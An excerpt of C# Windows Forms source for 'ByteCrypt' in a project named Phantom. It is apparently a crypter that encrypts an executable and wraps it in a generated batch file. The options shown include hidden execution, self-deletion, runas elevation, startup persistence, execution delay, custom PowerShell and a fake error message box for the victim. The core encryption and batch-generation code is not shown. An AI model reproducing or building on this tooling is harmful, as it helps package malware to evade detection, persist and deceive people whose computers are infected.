...
namespace Phantom
{
    public partial class ByteCrypt : Form
    {
        public ByteCrypt()
        {
            InitializeComponent();
        ...
        private void Crypt()
        {
            ...
            if (!File.Exists(_input) || Path.GetExtension(_input) != @".exe")
            {
                ...
                listBox2.Items.Add(@"[ERROR] Invalid Input file or file path...");
            ...
            if (fileType == FileType.Invalid)
            {
                ...
                listBox2.Items.Add(@"[ERROR] Invalid Input file...");
            ...
            string content = FileGen.CreateBat(_key, _iv, mode, hidden.Checked, selfDelete.Checked, runas.Checked, mutex.Checked, executionDelay.Checked, messageBox.Checked, messageboxcontent.Text, customPowershell.Checked, powershellcontents.Text, startup.Checked, fileType, ContentLineID, rng);
        ...
        private void UnpackSettings(SettingsObject obj)
        {
            ...
            mutex.Checked = obj.mutex;
            executionDelay.Checked = obj.executionDelay;
            messageBox.Checked = obj.messageBox;
            messageboxcontent.Text = obj.messageboxcontent;
            customPowershell.Checked = obj.customPowershell;
            powershellcontents.Text = obj.powershellcontents;
            try
            {
        ...
        private SettingsObject PackSettings()
        {
            SettingsObject obj = new SettingsObject()
            {
                ...
                mutex = mutex.Checked,
                executionDelay = executionDelay.Checked,
                messageBox = messageBox.Checked,
                messageboxcontent = messageboxcontent.Text,
                customPowershell = customPowershell.Checked,
                powershellcontents = powershellcontents.Text
            };
        ...
        private void messageBox_CheckedChanged(object sender, EventArgs e)
        {
            if (messageBox.Checked)
            {
                messageboxcontent.Enabled = true;
            }
            else
            {
                messageboxcontent.Enabled = false;
            }
        }

        private void customPowershell_CheckedChanged(object sender, EventArgs e)
        {
            if (customPowershell.Checked)
            {
                powershellcontents.Enabled = true;
            }
            else
            {
                powershellcontents.Enabled = false;
            }
        }

        private void mutex_CheckedChanged(object sender, EventArgs e)
        {
            if (mutex.Checked)
            {
                selfDelete.Enabled = false;
        ...
        {
            string messageContent = messageboxcontent.Text;
            MessageBox.Show(messageContent, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
        }
    }
}